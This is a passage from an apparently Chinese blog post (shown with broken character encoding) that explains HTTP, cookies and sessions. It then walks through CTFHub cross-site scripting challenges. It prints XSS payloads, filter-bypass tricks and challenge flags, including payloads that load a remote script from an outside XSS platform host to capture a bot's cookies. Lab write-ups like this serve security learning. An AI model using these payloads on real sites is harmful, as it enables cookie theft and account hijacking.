<h2 id="å‰ç½®çŸ¥è¯†"><a href="#å‰ç½®çŸ¥è¯†" class="headerlink" title="å‰ç½®çŸ¥è¯†"></a>å‰ç½®çŸ¥è¯†</h2><h3 id="HTTPè¯·æ±‚"><a href="#HTTPè¯·æ±‚" class="headerlink" title="HTTPè¯·æ±‚"></a>HTTPè¯·æ±‚</h3><ul>
<li>HTTPè¯·æ±‚æ–¹å¼ï¼šå¸¸ç”¨çš„æœ‰GETå’ŒPOSTä¸¤ç§æ–¹å¼ï¼Œè¿˜æœ‰HEADã€PUTã€DELETEã€OPTIONSç­‰</li>
<li>HTTPè¯·æ±‚æ ¼å¼ï¼š<ul>
<li>è¯·æ±‚æ–¹æ³•</li>
<li>è¯·æ±‚URL</li>
<li>HTTPåè®®åŠç‰ˆæœ¬</li>
<li>æŠ¥æ–‡å¤´</li>
<li>æŠ¥æ–‡ä½“</li>
</ul>
</li>
<li>HTTPå“åº”æ ¼å¼ï¼š<ul>
<li>HTTPåè®®åŠç‰ˆæœ¬</li>
<li>çŠ¶æ€ç åŠçŠ¶æ€ç æè¿°</li>
<li>å“åº”å¤´</li>
<li>å“åº”ä½“</li>
</ul>
</li>
<li>HTTPç‰¹ç‚¹ï¼š<ul>
<li>è¯·æ±‚-å“åº”æ¨¡å¼</li>
<li>çµæ´»å¯æ‰©å±•</li>
<li>å¯é ä¼ è¾“ï¼ˆå› ä¸ºHTTPå·¥ä½œåœ¨TCP&#x2F;IPåè®®ä¹‹ä¸Šï¼‰</li>
<li>æ— çŠ¶æ€ï¼š<ul>
<li>ç°å®ï¼šæ¯æ¬¡è¯·æ±‚éƒ½æ˜¯ç‹¬ç«‹çš„</li>
<li>éœ€æ±‚ï¼šä¿æŒä¼šè¯ï¼ˆé€šè¿‡Cookieå’ŒSessionå®ç°ï¼‰</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="cookie-å’Œ-session"><a href="#cookie-å’Œ-session" class="headerlink" title="cookie å’Œ session"></a>cookie å’Œ session</h3><ul>
<li>cookieå’Œsessionéƒ½æ˜¯ç”¨æ¥è·Ÿè¸ªæµè§ˆå™¨ç”¨æˆ·èº«ä»½çš„ä¼šè¯æ–¹å¼</li>
<li>cookieçš„å·¥ä½œæ–¹å¼ï¼š<ul>
<li>æµè§ˆå™¨ç«¯ç¬¬ä¸€æ¬¡å‘é€è¯·æ±‚åˆ°æœåŠ¡å™¨</li>
<li>æœåŠ¡å™¨ç«¯åˆ›å»ºcookieï¼Œè¯¥cookieä¸­åŒ…å«ç”¨æˆ·çš„ä¿¡æ¯ï¼Œé€šè¿‡<code>Set-Cookie</code>å­—æ®µè¿”å›ç»™æµè§ˆå™¨</li>
<li>æµè§ˆå™¨ç«¯å†æ¬¡å‘é€è¯·æ±‚æ—¶ï¼Œä¼šå°†cookieä¿¡æ¯é€šè¿‡<code>Cookie</code>å­—æ®µå‘é€ç»™æœåŠ¡å™¨</li>
<li>æœåŠ¡å™¨ç«¯é€šè¿‡<code>Cookie</code>å­—æ®µä¸­çš„ä¿¡æ¯è¯†åˆ«ä¸åŒçš„ç”¨æˆ·</li>
<li>sessionçš„å·¥ä½œæ–¹å¼ï¼š<ul>
<li>æµè§ˆå™¨ç«¯ç¬¬ä¸€æ¬¡å‘é€è¯·æ±‚åˆ°æœåŠ¡å™¨ï¼ŒæœåŠ¡å™¨ç«¯åˆ›å»ºä¸€ä¸ªsessionï¼ŒåŒæ—¶åˆ›å»ºä¸€ä¸ªç‰¹æ®Šçš„cookieï¼ˆnameä¸ºJSESSIONIDçš„å›ºå®šå€¼ï¼Œvalueä¸ºsessionå¯¹è±¡çš„IDï¼‰ï¼Œç„¶åå°†è¯¥Cookieå‘é€è‡³æµè§ˆå™¨ç«¯</li>
<li>æµè§ˆå™¨å†æ¬¡å‘é€è¯·æ±‚åˆ°æœåŠ¡å™¨ç«¯ï¼Œä¼šå°†è¯¥Cookieå‘é€ç»™æœåŠ¡å™¨ç«¯</li>
<li>æœåŠ¡å™¨ç«¯æ ¹æ®è¯¥Cookieä¸­çš„sessionIDæŸ¥è¯¢å¯¹åº”çš„sessionå¯¹è±¡ï¼Œä»è€Œè¯†åˆ«ä¸åŒçš„ç”¨æˆ·</li>
</ul>
</li>
</ul>
</li>
<li>cookieå’Œsessionçš„å¯¹æ¯”ï¼š<ul>
<li>cookieæ•°æ®å­˜æ”¾åœ¨å®¢æˆ·çš„æµè§ˆå™¨ä¸Šï¼Œsessionæ•°æ®æ”¾åœ¨æœåŠ¡å™¨ä¸Š</li>
<li>cookieä¸æ˜¯å¾ˆå®‰å…¨ï¼Œåˆ«äººå¯ä»¥åˆ†æå­˜æ”¾åœ¨æœ¬åœ°çš„COOKIEå¹¶è¿›è¡ŒCOOKIEæ¬ºéª—,å¦‚æœä¸»è¦è€ƒè™‘åˆ°å®‰å…¨åº”å½“ä½¿ç”¨session</li>
<li>sessionä¼šåœ¨ä¸€å®šæ—¶é—´å†…ä¿å­˜åœ¨æœåŠ¡å™¨ä¸Šã€‚å½“è®¿é—®å¢å¤šï¼Œä¼šæ¯”è¾ƒå ç”¨ä½ æœåŠ¡å™¨çš„æ€§èƒ½ï¼Œå¦‚æœä¸»è¦è€ƒè™‘åˆ°å‡è½»æœåŠ¡å™¨æ€§èƒ½æ–¹é¢ï¼Œåº”å½“ä½¿ç”¨COOKIE</li>
<li>å•ä¸ªcookieåœ¨å®¢æˆ·ç«¯çš„é™åˆ¶æ˜¯3Kï¼Œå°±æ˜¯è¯´ä¸€ä¸ªç«™ç‚¹åœ¨å®¢æˆ·ç«¯å­˜æ”¾çš„COOKIEä¸èƒ½3Kã€‚</li>
<li>æ‰€ä»¥ï¼šå°†ç™»é™†ä¿¡æ¯ç­‰é‡è¦ä¿¡æ¯å­˜æ”¾ä¸ºSESSION;å…¶ä»–ä¿¡æ¯å¦‚æœéœ€è¦ä¿ç•™ï¼Œå¯ä»¥æ”¾åœ¨COOKIEä¸­</li>
</ul>
</li>
</ul>
<h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><ul>
<li><a href="https://blog.csdn.net/chen13333336677/article/details/100939030">Cookieå’ŒSessionçš„åŒºåˆ«ï¼ˆé¢è¯•å¿…å¤‡ï¼‰_cookieå’Œsessionçš„ä½œç”¨å’ŒåŒºåˆ«-CSDNåšå®¢</a></li>
<li><a href="https://www.bilibili.com/video/BV1My4y1W7DF">é»‘å®¢6å°æ—¶å¸¦ä½ ä¸Šæ‰‹webå®‰å…¨æ”»é˜²ã€ä¸‰ç§æ¼æ´ã€XSSï¼ŒCSRFå’Œæ–‡ä»¶ä¸Šä¼ ã€‘å½»åº•æŒæ¡å¸¸è§webå®‰å…¨æ¼æ´-æŒç»­æ›´æ–°ä¸­_å“”å“©å“”å“©_bilibili</a></li>
</ul>
<h2 id="XSSå­¦ä¹ "><a href="#XSSå­¦ä¹ " class="headerlink" title="XSSå­¦ä¹ "></a>XSSå­¦ä¹ </h2><h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><ul>
<li>XSSï¼ˆCross Site Scriptingï¼‰è·¨ç«™è„šæœ¬æ”»å‡»ï¼šæ¶æ„æ”»å‡»è€…åˆ©ç”¨webé¡µé¢çš„æ¼æ´ï¼Œæ’å…¥ä¸€äº›æ¶æ„ä»£ç ï¼Œå½“ç”¨æˆ·è®¿é—®åˆ°é¡µé¢çš„æ—¶å€™ï¼Œä»£ç å°±ä¼šè¢«æ‰§è¡Œï¼Œä»è€Œè¾¾åˆ°æ”»å‡»çš„ç›®çš„ã€‚</li>
<li>XSSæ”»å‡»è½½ä½“ï¼šJavaScriptã€Javaã€VBScriptã€Flashã€ActiveXç­‰ã€‚</li>
<li>XSSå¯ä»¥åˆ†ä¸ºä¸¤ç±»ï¼šå­˜å‚¨å‹XSSå’Œåå°„å‹XSS</li>
</ul>
<h4 id="åå°„å‹XSS"><a href="#åå°„å‹XSS" class="headerlink" title="åå°„å‹XSS"></a>åå°„å‹XSS</h4><ul>
<li>éæŒä¹…åŒ–ï¼Œéœ€è¦æ¬ºéª—ç”¨æˆ·è‡ªå·±å»ç‚¹å‡»é“¾æ¥æ‰èƒ½è§¦å‘XSSä»£ç ï¼ˆæœåŠ¡å™¨ä¸­æ²¡æœ‰è¿™æ ·çš„é¡µé¢å’Œå†…å®¹ï¼‰ï¼Œä¸€èˆ¬å®¹æ˜“å‡ºç°åœ¨æœç´¢é¡µé¢ã€‚åå°„å‹XSSå¤§å¤šæ•°æ˜¯ç”¨æ¥ç›—å–ç”¨æˆ·çš„Cookieä¿¡æ¯ã€‚</li>
<li>åå°„å‹XSSæ”»å‡»æµç¨‹ï¼š<br><img src="/2024/02/12/WriteUp-CTFHub-%E6%8A%80%E8%83%BD%E6%A0%91-XSS%E7%B3%BB%E5%88%97/%E5%8F%8D%E5%B0%84%E5%9E%8BXSS%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B.jpg" alt="åå°„å‹XSSæ”»å‡»æµç¨‹.jpg"></li>
<li>æ•°æ®æµå‘æ˜¯ï¼š å‰ç«¯â€“&gt;åç«¯â€“&gt;å‰ç«¯</li>
</ul>
<h4 id="å­˜å‚¨å‹XSS"><a href="#å­˜å‚¨å‹XSS" class="headerlink" title="å­˜å‚¨å‹XSS"></a>å­˜å‚¨å‹XSS</h4><ul>
<li>å­˜å‚¨å‹XSSï¼ŒæŒä¹…åŒ–ï¼Œä»£ç æ˜¯å­˜å‚¨åœ¨æœåŠ¡å™¨ä¸­çš„ï¼Œå¦‚åœ¨ä¸ªäººä¿¡æ¯æˆ–å‘è¡¨æ–‡ç« ç­‰åœ°æ–¹ï¼Œæ’å…¥ä»£ç ï¼Œå¦‚æœæ²¡æœ‰è¿‡æ»¤æˆ–è¿‡æ»¤ä¸ä¸¥ï¼Œé‚£ä¹ˆè¿™äº›ä»£ç å°†å‚¨å­˜åˆ°æœåŠ¡å™¨ä¸­ï¼Œå…¶ä»–ç”¨æˆ·è®¿é—®è¯¥é¡µé¢çš„æ—¶å€™è§¦å‘ä»£ç æ‰§è¡Œã€‚è¿™ç§XSSæ¯”è¾ƒå±é™©ï¼Œå®¹æ˜“é€ æˆè •è™«ï¼Œç›—çªƒcookieç­‰ã€‚</li>
<li>å­˜å‚¨å‹XSSæ”»å‡»æµç¨‹ï¼š<br><img src="/2024/02/12/WriteUp-CTFHub-%E6%8A%80%E8%83%BD%E6%A0%91-XSS%E7%B3%BB%E5%88%97/%E5%AD%98%E5%82%A8%E5%9E%8BXSS%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B.jpg" alt="å­˜å‚¨å‹XSSæ”»å‡»æµç¨‹.jpg"></li>
<li>æ•°æ®æµå‘æ˜¯ï¼šå‰ç«¯â€“&gt;åç«¯â€“&gt;æ•°æ®åº“â€“&gt;åç«¯â€“&gt;å‰ç«¯</li>
</ul>
<h4 id="DOMåå°„å‹XSS"><a href="#DOMåå°„å‹XSS" class="headerlink" title="DOMåå°„å‹XSS"></a>DOMåå°„å‹XSS</h4><ul>
<li>ä¸ç»è¿‡åç«¯ï¼ŒDOM-XSSæ¼æ´æ˜¯åŸºäºæ–‡æ¡£å¯¹è±¡æ¨¡å‹(Document Objeet Model,DOM)çš„ä¸€ç§æ¼æ´ï¼ŒDOM-XSSæ˜¯é€šè¿‡urlä¼ å…¥å‚æ•°å»æ§åˆ¶è§¦å‘çš„ï¼Œå…¶å®ä¹Ÿå±äºåå°„å‹XSSã€‚</li>
<li>å¯èƒ½è§¦å‘DOMå‹XSSçš„å±æ€§ï¼š<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="property">referer</span></span><br><span class="line"><span class="variable language_">window</span>.<span class="property">name</span></span><br><span class="line">location</span><br><span class="line">innerHTML</span><br><span class="line">documen.<span class="property">write</span></span><br></pre></td></tr></table></figure></li>
<li>æ•°æ®æµå‘æ˜¯ï¼š å‰ç«¯â€“&gt;æµè§ˆå™¨</li>
</ul>
<h3 id="å‚è€ƒ-1"><a href="#å‚è€ƒ-1" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><ul>
<li><a href="https://blog.csdn.net/chen13333336677/article/details/100939030">Cookieå’ŒSessionçš„åŒºåˆ«ï¼ˆé¢è¯•å¿…å¤‡ï¼‰_cookieå’Œsessionçš„ä½œç”¨å’ŒåŒºåˆ«-CSDNåšå®¢</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/397940947">Webæ¼æ´ä¹‹XSS(è·¨ç«™è„šæœ¬æ”»å‡»)è¯¦è§£ - çŸ¥ä¹</a></li>
<li><a href="https://xssaq.com/">XSSå®‰å…¨å¹³å°</a></li>
<li><a href="https://www.bilibili.com/video/BV1My4y1W7DF">é»‘å®¢6å°æ—¶å¸¦ä½ ä¸Šæ‰‹webå®‰å…¨æ”»é˜²ã€ä¸‰ç§æ¼æ´ã€XSSï¼ŒCSRFå’Œæ–‡ä»¶ä¸Šä¼ ã€‘å½»åº•æŒæ¡å¸¸è§webå®‰å…¨æ¼æ´-æŒç»­æ›´æ–°ä¸­_å“”å“©å“”å“©_bilibili</a></li>
</ul>
<h2 id="WriteUp"><a href="#WriteUp" class="headerlink" title="WriteUp"></a>WriteUp</h2><h3 id="åå°„å‹"><a href="#åå°„å‹" class="headerlink" title="åå°„å‹"></a>åå°„å‹</h3><h4 id="è§£é¢˜è¿‡ç¨‹"><a href="#è§£é¢˜è¿‡ç¨‹" class="headerlink" title="è§£é¢˜è¿‡ç¨‹"></a>è§£é¢˜è¿‡ç¨‹</h4><ul>
<li>ç¬¬ä¸€ä¸ªè¾“å…¥æ¡†ä¸­è¾“å…¥<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>ï¼Œç‚¹å‡»æäº¤ï¼Œé¡µé¢å¼¹å‡º<code>1</code>ï¼Œè¯´æ˜å­˜åœ¨XSSæ¼æ´<br><img src="/2024/02/12/WriteUp-CTFHub-%E6%8A%80%E8%83%BD%E6%A0%91-XSS%E7%B3%BB%E5%88%97/wp-%E5%8F%8D%E5%B0%84%E5%9E%8B-1.png"></li>
<li>ç¬¬ä¸€ä¸ªè¾“å…¥æ¡†ä¸­è¾“å…¥åŸºäºXSSå®‰å…¨å¹³å°æä¾›çš„payloadï¼š<br><img src="/2024/02/12/WriteUp-CTFHub-%E6%8A%80%E8%83%BD%E6%A0%91-XSS%E7%B3%BB%E5%88%97/wp-%E5%8F%8D%E5%B0%84%E5%9E%8B-2.png"></li>
<li>æ„é€ urlï¼Œè¾“å…¥ç¬¬äºŒä¸ªè¾“å…¥æ¡†è®©botæœºå™¨è§¦å‘XSS,XSSå¹³å°æˆåŠŸæ¥æ”¶åˆ°æ•°æ®<br><img src="/2024/02/12/WriteUp-CTFHub-%E6%8A%80%E8%83%BD%E6%A0%91-XSS%E7%B3%BB%E5%88%97/wp-%E5%8F%8D%E5%B0%84%E5%9E%8B-3.png"></li>
</ul>
<h4 id="FLAG"><a href="#FLAG" class="headerlink" title="FLAG"></a>FLAG</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctfhub&#123;3d18622f6ae7760ceab0dda2&#125;</span><br></pre></td></tr></table></figure>

<h4 id="å‚è€ƒ-2"><a href="#å‚è€ƒ-2" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h4><ul>
<li><a href="https://xssaq.com/">XSSå®‰å…¨å¹³å°</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/339572686">æ‰‹æ’•CTFHub-Web(äº”)ï¼šXSS - çŸ¥ä¹</a></li>
</ul>
<h3 id="å­˜å‚¨å‹"><a href="#å­˜å‚¨å‹" class="headerlink" title="å­˜å‚¨å‹"></a>å­˜å‚¨å‹</h3><h4 id="è§£é¢˜è¿‡ç¨‹-1"><a href="#è§£é¢˜è¿‡ç¨‹-1" class="headerlink" title="è§£é¢˜è¿‡ç¨‹"></a>è§£é¢˜è¿‡ç¨‹</h4><ul>
<li>ç¬¬ä¸€ä¸ªè¾“å…¥æ¡†ä¸­è¾“å…¥<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>ï¼Œç‚¹å‡»æäº¤ï¼Œé¡µé¢å¼¹å‡º<code>1</code>ï¼Œè¯´æ˜å­˜åœ¨XSSæ¼æ´<br><img src="/2024/02/12/WriteUp-CTFHub-%E6%8A%80%E8%83%BD%E6%A0%91-XSS%E7%B3%BB%E5%88%97/wp-%E5%AD%98%E5%82%A8%E5%9E%8B-1.png"></li>
<li>æŸ¥çœ‹æºç ï¼Œå‘ç°å­˜åœ¨<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>ï¼Œè¯´æ˜å­˜åœ¨å­˜å‚¨å‹XSSæ¼æ´<br><img src="/2024/02/12/WriteUp-CTFHub-%E6%8A%80%E8%83%BD%E6%A0%91-XSS%E7%B3%BB%E5%88%97/wp-%E5%AD%98%E5%82%A8%E5%9E%8B-2.png"></li>
<li>ç¬¬ä¸€ä¸ªè¾“å…¥æ¡†ä¸­è¾“å…¥åŸºäºXSSå®‰å…¨å¹³å°æä¾›çš„payloadï¼Œå¯è§æ¶æ„ä»£ç å·²ç»ä¸Šä¼ åˆ°æœåŠ¡å™¨ï¼Œå¹¶ä¸”XSSå¹³å°ä¹ŸæˆåŠŸæ¥æ”¶åˆ°æ•°æ®ï¼ˆæ­¤æ—¶å¹¶ä¸æ˜¯ctfhubçš„botå‘é€çš„è¯·æ±‚ï¼Œæ‰€ä»¥æ²¡æœ‰cookieï¼‰<br><img src="/2024/02/12/WriteUp-CTFHub-%E6%8A%80%E8%83%BD%E6%A0%91-XSS%E7%B3%BB%E5%88%97/wp-%E5%AD%98%E5%82%A8%E5%9E%8B-3.png"></li>
<li>ç¬¬äºŒä¸ªè¾“å…¥æ¡†ä¸­è¾“å…¥å½“å‰é¡µé¢çš„urlï¼Œè®©botæœºå™¨è§¦å‘XSSï¼ŒXSSå¹³å°æˆåŠŸæ¥æ”¶åˆ°æ•°æ®<br><img src="/2024/02/12/WriteUp-CTFHub-%E6%8A%80%E8%83%BD%E6%A0%91-XSS%E7%B3%BB%E5%88%97/wp-%E5%AD%98%E5%82%A8%E5%9E%8B-4.png"></li>
</ul>
<h4 id="FLAG-1"><a href="#FLAG-1" class="headerlink" title="FLAG"></a>FLAG</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctfhub&#123;444ad0fcba38ed2e9da18d9d&#125;</span><br></pre></td></tr></table></figure>

<h4 id="å‚è€ƒ-3"><a href="#å‚è€ƒ-3" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h4><ul>
<li><a href="https://blog.csdn.net/m0_51191308/article/details/135407315">CTFHub | å­˜å‚¨å‹-CSDNåšå®¢</a></li>
</ul>
<h3 id="DOMåå°„"><a href="#DOMåå°„" class="headerlink" title="DOMåå°„"></a>DOMåå°„</h3><h4 id="è§£é¢˜è¿‡ç¨‹-2"><a href="#è§£é¢˜è¿‡ç¨‹-2" class="headerlink" title="è§£é¢˜è¿‡ç¨‹"></a>è§£é¢˜è¿‡ç¨‹</h4><ul>
<li>ç¬¬ä¸€ä¸ªè¾“å…¥æ¡†ä¸­è¾“å…¥<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>ï¼Œç‚¹å‡»æäº¤ï¼Œé¡µé¢å¹¶æ²¡æœ‰å¼¹å‡ºï¼ŒæŸ¥çœ‹ç½‘é¡µæºç ï¼Œå‘ç°é—­åˆäº†ï¼š<br><img src="/2024/02/12/WriteUp-CTFHub-%E6%8A%80%E8%83%BD%E6%A0%91-XSS%E7%B3%BB%E5%88%97/wp-DOM%E5%8F%8D%E5%B0%84-1.png"></li>
<li>æ¢ä¸€ä¸ªpayloadï¼Œè¾“å…¥<code>&lt;img src=1 onerror=alert(1)&gt;</code>ï¼Œç‚¹å‡»æäº¤ï¼Œé¡µé¢å¼¹å‡º<code>1</code>ï¼Œè¯´æ˜å­˜åœ¨DOMåå°„XSSæ¼æ´ï¼š<br><img src="/2024/02/12/WriteUp-CTFHub-%E6%8A%80%E8%83%BD%E6%A0%91-XSS%E7%B3%BB%E5%88%97/wp-DOM%E5%8F%8D%E5%B0%84-2.png"></li>
<li>ç¬¬ä¸€ä¸ªè¾“å…¥æ¡†ä¸­ä¹Ÿå¯ä»¥è¾“å…¥æ„é€ åŒ…å«scriptæ ‡ç­¾çš„payloadï¼ŒåŠæå‰é—­åˆscriptæ ‡ç­¾çš„payloadï¼Œä¾‹å¦‚<code>&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code>ï¼Œéƒ½å¯ä»¥æˆåŠŸè§¦å‘XSSæ¼æ´ï¼š<br><img src="/2024/02/12/WriteUp-CTFHub-%E6%8A%80%E8%83%BD%E6%A0%91-XSS%E7%B3%BB%E5%88%97/wp-DOM%E5%8F%8D%E5%B0%84-3.png"></li>
<li>ç¬¬äºŒä¸ªè¾“å…¥æ¡†è¾“å…¥åŸºäºXSSå¹³å°æä¾›çš„payloadæ„é€ çš„urlï¼Œè®©botæœºå™¨è§¦å‘XSSï¼ŒXSSå¹³å°æˆåŠŸæ¥æ”¶åˆ°æ•°æ®ï¼š<br><img src="/2024/02/12/WriteUp-CTFHub-%E6%8A%80%E8%83%BD%E6%A0%91-XSS%E7%B3%BB%E5%88%97/wp-DOM%E5%8F%8D%E5%B0%84-4.png"></li>
</ul>
<h4 id="FLAG-2"><a href="#FLAG-2" class="headerlink" title="FLAG"></a>FLAG</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctfhub&#123;824bae1b53917ae969fa7d84&#125;</span><br></pre></td></tr></table></figure>

<h4 id="å‚è€ƒ-4"><a href="#å‚è€ƒ-4" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h4><ul>
<li><a href="https://blog.csdn.net/weixin_49125123/article/details/131545561">CTFHub XSS DOMåå°„ WriteUp_ctfhubçš„xssåå°„-CSDNåšå®¢</a></li>
<li><a href="https://blog.csdn.net/weixin_43825028/article/details/119112234">InnerHTMLå±æ€§çš„XSSåˆ©ç”¨_innerhtml xss-CSDNåšå®¢</a></li>
</ul>
<h3 id="DOMè·³è½¬"><a href="#DOMè·³è½¬" class="headerlink" title="DOMè·³è½¬"></a>DOMè·³è½¬</h3><h4 id="è§£é¢˜è¿‡ç¨‹-3"><a href="#è§£é¢˜è¿‡ç¨‹-3" class="headerlink" title="è§£é¢˜è¿‡ç¨‹"></a>è§£é¢˜è¿‡ç¨‹</h4><ul>
<li>æŸ¥çœ‹ç½‘é¡µæºç ï¼Œå‘ç°ä¸€æ®µjavascriptä»£ç ï¼š<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">  <span class="keyword">var</span> target = location.<span class="property">search</span>.<span class="title function_">split</span>(<span class="string">&quot;=&quot;</span>)</span><br><span class="line">  <span class="keyword">if</span> (target[<span class="number">0</span>].<span class="title function_">slice</span>(<span class="number">1</span>) == <span class="string">&quot;jumpto&quot;</span>) &#123;</span><br><span class="line">      location.<span class="property">href</span> = target[<span class="number">1</span>];</span><br><span class="line">  &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></li>
<li>è¿™æ®µä»£ç çš„ä½œç”¨æ˜¯ï¼šå¦‚æœurlä¸­åŒ…å«<code>jumpto</code>å‚æ•°ï¼Œå°±è·³è½¬åˆ°<code>jumpto</code>å‚æ•°æŒ‡å®šçš„url</li>
<li>ä½¿ç”¨javascriptä¼ªåè®®æ„é€ payload<code>?jumpto=javascript:alert(1)</code>ï¼Œæ‹¼æ¥urlå¹¶è®¿é—®ï¼Œé¡µé¢å¼¹å‡º<code>1</code>ï¼Œè¯´æ˜å­˜åœ¨DOMè·³è½¬XSSæ¼æ´ï¼š<br><img src="/2024/02/12/WriteUp-CTFHub-%E6%8A%80%E8%83%BD%E6%A0%91-XSS%E7%B3%BB%E5%88%97/wp-DOM%E8%B7%B3%E8%BD%AC-1.png"></li>
<li>ä½¿ç”¨jQueryçš„<code>$.getScript()</code>å‡½æ•°æ¥å¼‚æ­¥åŠ è½½å¹¶æ‰§è¡Œæ¥è‡ªxsså¹³å°çš„jsè„šæœ¬ï¼Œæ„é€ å‡ºæ¥çš„payloadä¸º<code>?jumpto=javascript:$.getScript(&#39;//uj.ci/l62&#39;)</code></li>
<li>ç¬¬äºŒä¸ªè¾“å…¥æ¡†è¾“å…¥æ„é€ çš„urlï¼Œç‚¹å‡»å‘é€ï¼Œè®©botæœºå™¨è§¦å‘XSSï¼ŒXSSå¹³å°æˆåŠŸæ¥æ”¶åˆ°æ•°æ®ï¼š<br><img src="/2024/02/12/WriteUp-CTFHub-%E6%8A%80%E8%83%BD%E6%A0%91-XSS%E7%B3%BB%E5%88%97/wp-DOM%E8%B7%B3%E8%BD%AC-2.png"></li>
</ul>
<h4 id="FLAG-3"><a href="#FLAG-3" class="headerlink" title="FLAG"></a>FLAG</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctfhub&#123;133fda97d6991a94aedc3495&#125;</span><br></pre></td></tr></table></figure>

<h4 id="å‚è€ƒ-5"><a href="#å‚è€ƒ-5" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h4><ul>
<li><a href="https://blog.csdn.net/weixin_49125123/article/details/131546660">CTFHub XSS DOMè·³è½¬ WriteUp_xss dom jumpto ?-CSDNåšå®¢</a></li>
<li><a href="https://www.freebuf.com/articles/web/262013.html">ç‚æŠ€ç³»åˆ—ä¹‹ä¸€ç¯‡å°±å¤Ÿäº†â€”â€”XSSè¿›é˜¶ - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·</a></li>
<li><a href="https://www.cnblogs.com/song-song/p/5277838.html">XSSç¯‡â€”â€”javascript:ä¼ªåè®®_jsä¼ªåè®®-CSDNåšå®¢</a></li>
</ul>
<h3 id="è¿‡æ»¤ç©ºæ ¼"><a href="#è¿‡æ»¤ç©ºæ ¼" class="headerlink" title="è¿‡æ»¤ç©ºæ ¼"></a>è¿‡æ»¤ç©ºæ ¼</h3><h4 id="è§£é¢˜è¿‡ç¨‹-4"><a href="#è§£é¢˜è¿‡ç¨‹-4" class="headerlink" title="è§£é¢˜è¿‡ç¨‹"></a>è§£é¢˜è¿‡ç¨‹</h4><ul>
<li>ç¬¬ä¸€ä¸ªè¾“å…¥æ¡†ä¸­è¾“å…¥<code>&lt;script&gt;alert(&#39;1  1&#39;)&lt;/script&gt;</code>ï¼Œç‚¹å‡»æäº¤ï¼Œå¼¹å‡ºæ¡†ä¸­æ˜¾ç¤º<code>11</code>ï¼Œè¯´æ˜ç©ºæ ¼è¢«è¿‡æ»¤äº†ï¼š<br><img src="/2024/02/12/WriteUp-CTFHub-%E6%8A%80%E8%83%BD%E6%A0%91-XSS%E7%B3%BB%E5%88%97/wp-%E8%BF%87%E6%BB%A4%E7%A9%BA%E6%A0%BC-1.png"></li>
<li>ä½¿ç”¨<code>/**/</code>ç»•è¿‡ç©ºæ ¼è¿‡æ»¤</li>
<li>åŸºäºXSSå¹³å°æä¾›çš„payloadï¼Œæ„é€ payloadä¸º<code>&lt;sCRiPt/**/sRC=//uj.ci/l62&gt;&lt;/sCrIpT&gt;</code>ï¼Œæ‹¼æ¥url</li>
<li>ç¬¬äºŒä¸ªè¾“å…¥æ¡†è¾“å…¥æ„é€ çš„urlï¼Œç‚¹å‡»å‘é€ï¼Œè®©botæœºå™¨è§¦å‘XSSï¼ŒXSSå¹³å°æˆåŠŸæ¥æ”¶åˆ°æ•°æ®ï¼š<br><img src="/2024/02/12/WriteUp-CTFHub-%E6%8A%80%E8%83%BD%E6%A0%91-XSS%E7%B3%BB%E5%88%97/wp-%E8%BF%87%E6%BB%A4%E7%A9%BA%E6%A0%BC-2.png"></li>
</ul>
<h4 id="FLAG-4"><a href="#FLAG-4" class="headerlink" title="FLAG"></a>FLAG</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctfhub&#123;2f8b7263db5a198dc1179092&#125;</span><br></pre></td></tr></table></figure>

<h4 id="å‚è€ƒ-6"><a href="#å‚è€ƒ-6" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h4><ul>
<li><a href="https://blog.csdn.net/m0_51191308/article/details/128172056">CTFHub | è¿‡æ»¤ç©ºæ ¼_ctfhubè¿‡æ»¤ç©ºæ ¼-CSDNåšå®¢</a></li>
<li><a href="https://blog.csdn.net/xinyue9966/article/details/121099189">XSSç»•è¿‡æ–¹æ³•æ€»ç»“_xssç©ºæ ¼è¿‡æ»¤ç»•è¿‡-CSDNåšå®¢</a></li>
</ul>
<h3 id="è¿‡æ»¤å…³é”®è¯"><a href="#è¿‡æ»¤å…³é”®è¯" class="headerlink" title="è¿‡æ»¤å…³é”®è¯"></a>è¿‡æ»¤å…³é”®è¯</h3><h4 id="è§£é¢˜è¿‡ç¨‹-5"><a href="#è§£é¢˜è¿‡ç¨‹-5" class="headerlink" title="è§£é¢˜è¿‡ç¨‹"></a>è§£é¢˜è¿‡ç¨‹</h4><ul>
<li>ç¬¬ä¸€ä¸ªè¾“å…¥æ¡†ä¸­è¾“å…¥<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>ï¼Œç‚¹å‡»æäº¤ï¼Œå‘ç°<code>script</code>å…³é”®è¯è¢«è¿‡æ»¤äº†ï¼š<br><img src="/2024/02/12/WriteUp-CTFHub-%E6%8A%80%E8%83%BD%E6%A0%91-XSS%E7%B3%BB%E5%88%97/wp-%E8%BF%87%E6%BB%A4%E5%85%B3%E9%94%AE%E8%AF%8D-1.png"></li>
